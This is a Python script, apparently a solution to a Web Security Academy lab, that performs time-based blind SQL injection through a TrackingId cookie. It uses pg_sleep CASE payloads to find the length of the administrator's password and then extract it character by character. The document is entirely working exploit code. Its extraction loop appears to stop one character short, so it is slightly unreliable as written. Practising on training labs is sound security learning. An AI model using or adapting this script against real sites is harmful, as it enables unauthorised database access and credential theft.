import requests
import time

host="https://acfc1ffc1fa4700680e40c97007000af.web-security-academy.net/"
passw=""

s=time.time()

lenPass=0
for i in range(1,50):
	t0=time.time()
	trackingId="'%3BSELECT+CASE+WHEN+(username='administrator' and length(password)="+str(i)+")+THEN+pg_sleep(5)+ELSE+NULL+END+FROM+users--"
	#print(trackingId)
	c={'TrackingId':trackingId}
	resp=requests.get(url=host,cookies=c)
	t1=time.time()
	if((t1-t0)>5):
		lenPass=i
		break
		
		
print("Length of password is: ",lenPass)


alph="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for i in range(1,lenPass):
	pos=str(i)
	for j in alph:
		trackingId="'%3BSELECT+CASE+WHEN+(username='administrator' and substring(password,"+pos+",1)='"+j+"')+THEN+pg_sleep(5)+ELSE+NULL+END+FROM+users--"
		c={'TrackingId':trackingId}
		t0=time.time()
		resp=requests.get(url=host,cookies=c)
		t1=time.time()
		#print(trackingId)
		#print(resp.status_code)
		if((t1-t0)>5):
			#print("YES")
			passw=passw+j
			#print(passw)
			break
			
e=time.time()
print("Time taken: ",(e-s))			
print("Password is: ",passw)
